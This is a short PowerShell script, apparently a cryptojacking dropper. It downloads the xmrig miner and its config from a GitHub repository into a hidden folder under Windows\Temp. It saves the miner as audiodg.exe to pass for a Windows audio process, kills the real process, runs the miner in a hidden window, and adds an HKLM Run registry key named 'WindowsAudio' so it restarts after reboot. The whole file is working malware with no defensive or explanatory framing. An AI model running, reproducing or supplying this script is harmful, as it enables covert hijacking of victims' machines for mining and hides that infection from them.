$M="C:\Windows\Temp\Microsoft\Network\"
$R="https://raw.githubusercontent.com/invix0115-tech/spread/main/"

md $M -Force | Out-Null
iwr "$R/xmrig.exe" -OutFile "$M\audiodg.exe"
iwr "$R/config.json" -OutFile "$M\config.json"
sleep 3
ps audiodg -ea 0 | kill -Force
start "$M\audiodg.exe" -Window Hidden
New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsAudio" -Value "$M\audiodg.exe" -Property String -Force